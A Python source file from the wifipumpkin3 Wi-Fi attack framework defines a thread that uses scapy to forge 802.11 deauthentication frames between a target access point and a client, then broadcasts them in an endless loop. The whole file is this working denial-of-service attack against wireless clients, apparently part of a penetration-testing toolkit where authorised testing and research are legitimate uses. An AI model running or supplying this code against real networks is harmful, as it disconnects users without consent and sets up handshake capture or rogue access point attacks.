from scapy.all import *
from PyQt5.QtCore import QThread
from wifipumpkin3.core.utility.printer import display_messages, setcolor

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2020 P0cL4bs Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class ThreadDeauth(QThread):
    def __init__(self, bssid, client, interface):
        QThread.__init__(self)
        self.bssid = bssid
        self.client = client
        self.interface = interface
        self.status = False
        self.pkts = []

    def run(self):
        print(
            display_messages(
                "starting thread {}".format(setcolor(self.objectName(), color="green")),
                info=True,
            )
        )
        self.status = True
        conf.iface = self.interface
        pkt1 = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=12,
                addr1=self.client,
                addr2=self.bssid,
                addr3=self.bssid,
            )
            / Dot11Deauth(reason=7)
        )
        pkt2 = (
            Dot11(addr1=self.bssid, addr2=self.client, addr3=self.client)
            / Dot11Deauth()
        )
        self.pkts.append(pkt1), self.pkts.append(pkt2)
        while self.status:
            for packet in self.pkts:
                sendp(packet, verbose=False, count=1, iface=self.interface)

    def stop(self):
        self.status = False
        print(
            display_messages(
                "thread {} successfully stopped".format(self.objectName()), info=True
            )
        )
